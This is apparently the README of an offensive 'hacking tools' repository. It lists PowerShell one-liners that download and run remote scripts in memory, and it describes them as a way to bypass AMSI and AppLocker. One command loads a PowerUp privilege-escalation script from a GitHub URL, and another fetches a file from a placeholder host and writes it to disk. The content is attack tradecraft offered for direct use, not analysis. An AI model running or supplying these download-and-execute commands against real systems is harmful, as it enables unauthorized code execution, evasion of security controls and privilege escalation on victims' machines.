# Synapse

> Repo for hacking tools

# Get files
## IEX (Doesnt touch disk - Helps to bypass AMSI/Applocker)
`IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`
> use it to via github
`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/evilNeuron/Synapse/master/privesc/windows/PowerUpInvoke.ps1')`

## Write to disk
`invoke-webrequest -Uri http://xxxxx:9000/somefile -OutFile somefile`
